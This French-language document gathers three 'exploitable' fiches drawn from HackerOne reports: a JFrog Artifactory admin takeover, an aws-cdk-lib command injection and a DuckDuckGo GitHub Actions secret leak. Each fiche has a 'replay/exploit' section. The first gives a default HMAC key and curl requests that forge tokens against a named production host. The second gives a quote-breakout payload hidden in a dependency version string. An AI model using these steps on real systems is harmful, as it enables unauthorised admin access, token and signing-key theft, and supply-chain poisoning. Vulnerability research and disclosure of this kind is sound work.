# Fiches SSS — Supply Chain — Dependency Confusion, CI/CD

*3 fiches exploitables issues du corpus 2025-2026 — chaque extrait « Preuve technique » est copié verbatim de la source brute indiquée.*

### Full Admin Takeover of R3 Limited's JFrog Artifactory - Corda & CBDC Supply Chain

**📄 Cas réel**
sévérité : critical · [source](https://hackerone.com/reports/3994056)

L'instance JFrog Artifactory de R3 (`software.r3.com`, 7.133.16) est vulnérable à CVE-2026-82329 (CVSS 9.8) : la `join.key` vide par défaut rend la clé HMAC de signature connue (32 espaces, 0x20). Un JWT HS256 forgé permet de s'enregistrer comme service de confiance, puis d'obtenir un jeton admin. Impact prouvé : 292 comptes lisibles, 269 dépôts (81 Corda, 4 CBDC), 262 jetons extraits (30 admin non expirants), écriture sur les dépôts, clé GPG de signature et identifiants SMTP Office 365 en clair.

**Cause racine :** `join.key` vide par défaut : le padding PKCS7 de la clé hexadécodée vide donne une clé HMAC de 32 espaces, permettant de forger un JWT accepté par le endpoint de join, puis d'escalader le jeton émis en jeton admin.

**Preuve technique (verbatim depuis la source) :**

```
When the `join.key` file is empty (default installation), the HMAC signing key becomes 32 space characters (0x20 bytes) due to PKCS7 padding of the empty hex-decoded key.
```
```
key = b'\x20' * 32  # 32 space characters — the default empty join key
```
```
curl -sk -X POST -H "Content-Type: text/plain" \
  -d '<JWT_FROM_STEP_1>' \
  https://software.r3.com/access/api/v1/registry/join
```
```
curl -sk -X POST \
  -H "Authorization: Bearer <TOKEN_FROM_STEP_2>" \
  -H "Content-Type: application/json" \
  -d '{"scope": "applied-permissions/admin", "expires_in": 3600}' \
  https://software.r3.com/access/api/v1/tokens
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : instance Artifactory joignable avec la configuration par défaut (join key vide) ; aucune authentification.
- Étapes : 1. forger le JWT HS256 (claims `service_id`, `node_id`, `skip_node_registration`) avec la clé de 32 espaces 2. `POST /access/api/v1/registry/join` → HTTP 201 + jeton 3. `POST /access/api/v1/tokens` avec `{"scope": "applied-permissions/admin", "expires_in": 3600}` 4. confirmer via `GET /artifactory/api/security/users` (292) et `/api/repositories` (269).
- Pièges / limites : corrigé en Artifactory 7.191.14+ ; les 30 jetons admin n'expirent jamais ; l'auteur a nettoyé ses artefacts de test ; dépend de la configuration par défaut (join key vide).

**Reproductibilité :** haute — clé par défaut connue, code Python et requêtes complets, aucun compte ni secret à deviner.

**Techniques :** jwt hmac forgery, default empty join key, unauthenticated admin takeover, token scope escalation, gpg keypair extraction, supply chain artifact poisoning

**Correspond aux classes qualifiantes :** auth-bypass, supply-chain, info-disclosure

**Signal (endpoints/fonctions observés) :**
- `POST /access/api/v1/registry/join`, `POST /access/api/v1/tokens`
- `GET /artifactory/api/security/users`, `GET /artifactory/api/repositories`
- `GET /access/api/v1/tokens`, `GET /artifactory/api/security/keypair`
- `POST /artifactory/api/system/decrypt` puis `GET /artifactory/api/system/configuration`

**Paramètres impliqués :** `service_id`, `node_id`, `skip_node_registration`, `scope`, `expires_in`

---

### OS Command Injection in aws-cdk-lib NodejsFunction via OsCommand Helper

**📄 Cas réel**
sévérité : high · [source](https://hackerone.com/reports/3637898)

Le construct `NodejsFunction` d'`aws-cdk-lib/aws-lambda-nodejs` construit ses commandes shell de bundling Docker via le helper interne `OsCommand`, dont `write()`/`writeJson()` entourent les données de quotes simples (`echo '${data}'`) sans échapper les quotes internes. Avec `nodeModules`, les versions de dépendances de `package.json` sont sérialisées par `JSON.stringify()` (qui préserve les quotes simples) puis injectées : une version piégée s'échappe de l'`echo` et exécute des commandes dans le conteneur Docker, qui monte le répertoire projet de l'hôte (`/asset-input`, `/asset-output`). Un paquet npm malveillant déclenche donc la RCE sur toute machine ou CI exécutant `cdk synth` / `cdk deploy`.

**Cause racine :** `OsCommand.write()` interpole des données dans `echo '${data}'` sans échappement ; le helper `posixShellEscape` présent dans le même fichier n'est pas appliqué, et les chaînes de version de dépendances finissent dans une commande `bash -c` exécutée en Docker.

**Preuve technique (verbatim depuis la source) :**

```typescript
public write(filePath: string, data: string): string {
    // ...
    return `echo '${data}' > "${filePath}"`;
    //           ^ NO ESCAPING — single quotes in data break out
}
```
```
"lodash": "4.17.21' && touch /asset-input/pwned_via_json.txt && echo '"
```
```
echo '{\"dependencies\":{\"lodash\":\"4.17.21' && \
  touch /asset-input/pwned_via_json.txt && \
  echo '\"}}' > \"/asset-output/package.json\" && \
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : Node.js, npm et Docker installés ; un projet CDK avec `NodejsFunction` en `forceDockerBundling: true` et `bundling.nodeModules`.
- Étapes : 1. créer le projet (`npm init -y`, installer `aws-cdk-lib constructs aws-cdk typescript ts-node @types/node lodash`) 2. créer `app.ts` avec `bundling: { forceDockerBundling: true, nodeModules: ['lodash'] }` 3. mettre le payload dans la version de `lodash` dans `package.json` 4. `npx cdk synth` 5. vérifier sur l'hôte : `ls -la pwned_via_json.txt`.
- Pièges / limites : `forceDockerBundling` + `nodeModules` requis ; les commandes s'exécutent dans le conteneur mais écrivent sur l'hôte via bind mounts ; la commande générée casse le JSON au passage, sans empêcher l'exécution.

**Reproductibilité :** haute — PoC complet (code, payload, commandes), outils publics, cible locale Docker.

**Techniques :** os command injection, single quote breakout, npm dependency version poisoning, supply chain rce, docker bind mount escape

**Correspond aux classes qualifiantes :** command-injection, rce, supply-chain

**Signal (endpoints/fonctions observés) :**
- `NodejsFunction` (`aws-cdk-lib/aws-lambda-nodejs`)
- `OsCommand.write()` / `OsCommand.writeJson()`
- `packages/aws-cdk-lib/aws-lambda-nodejs/lib/bundling.ts`
- `bundling: { forceDockerBundling: true, nodeModules: [...] }`
- bind mounts Docker `/asset-input`, `/asset-output`
- helper `posixShellEscape` (présent mais non appliqué aux `OsCommand`)

**Paramètres impliqués :** `bundling.nodeModules`, chaîne de version de dépendance dans `package.json`

---

### RCE + PAT Exfiltration via pull_request_target in auto-respond-pr.yml (DuckDuckGo)

**📄 Cas réel**
sévérité : critical · [source](https://hackerone.com/reports/3619288)

Le workflow `.github/workflows/auto-respond-pr.yml` de `duckduckgo/privacy-configuration` utilise `pull_request_target` (contexte privilégié avec secrets), checkoute le fork comme « base » et « PR », puis exécute `npm ci` + `node index.js` sur le code du fork. `PRIVACY_CONFIG_PAT` (auto-approbation des PR) est exposé dans les étapes suivantes, et le job `sync_asana_on_close` expose `ASANA_ACCESS_TOKEN` et `GH_RO_PAT` à la fermeture de toute PR, y compris d'un fork. Le dépôt étant consommé via une dépendance flottante `main` sans tag ni SHA, le PAT volé permet de fusionner une configuration piégée qui se propage à tous les navigateurs DuckDuckGo.

**Cause racine :** `pull_request_target` (secrets accessibles) avec checkout du fork comme « base » et exécution de code non fiable (`npm ci`, `node index.js`) dans le même workflow.

**Preuve technique (verbatim depuis la source) :**

```
The workflow uses `pull_request_target` (privileged context with secrets) and contains two critical flaws:

1. **Fork checkout as "base"**: The base branch checkout uses `repository: ${{ github.event.pull_request.head.repo.full_name }}` — this checks out the **fork's** repo, not the actual base. The attacker controls BOTH checkouts.
2. **Arbitrary code execution**: `npm ci` and `node index.js` run on fork code with `PRIVACY_CONFIG_PAT` available in subsequent steps.
```
```
Additionally, the `sync_asana_on_close` job unconditionally exposes `ASANA_ACCESS_TOKEN` and `GH_RO_PAT` when any PR (including fork PRs) is closed.
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : n'importe quel compte GitHub ; le workflow vulnérable `auto-respond-pr.yml` actif sur le dépôt concerné.
- Étapes : 1. forker `duckduckgo/privacy-configuration` 2. ouvrir une PR depuis le fork (déclenche `pull_request_target`) 3. le job exécute `npm ci` puis `node index.js` sur le code contrôlé par l'attaquant 4. récupérer `PRIVACY_CONFIG_PAT` exposé dans les étapes suivantes (mécanisme exact non documenté dans la source).
- Pièges / limites : la source ne reproduit pas le YAML vulnérable ni la commande d'exfiltration ; l'impact dépend de la dépendance flottante `main` sans tag/SHA ; rapport distinct de #3619287 (`semver-label.yml`).

**Reproductibilité :** moyenne — compte GitHub trivial, mais exfiltration du PAT et contenu exact du workflow non documentés.

**Techniques :** github actions, pull request target, untrusted fork checkout, npm ci code execution, secret exfiltration, supply chain poisoning

**Correspond aux classes qualifiantes :** rce, supply-chain, info-disclosure

**Signal (endpoints/fonctions observés) :**
- `.github/workflows/auto-respond-pr.yml` → `pull_request_target`
- `repository: ${{ github.event.pull_request.head.repo.full_name }}` (checkout « base »)
- `npm ci` + `node index.js` (exécution du code du fork)
- job `sync_asana_on_close` (fermeture de PR)
- secrets `PRIVACY_CONFIG_PAT`, `ASANA_ACCESS_TOKEN`, `GH_RO_PAT`

**Paramètres impliqués :** `github.event.pull_request.head.repo.full_name`
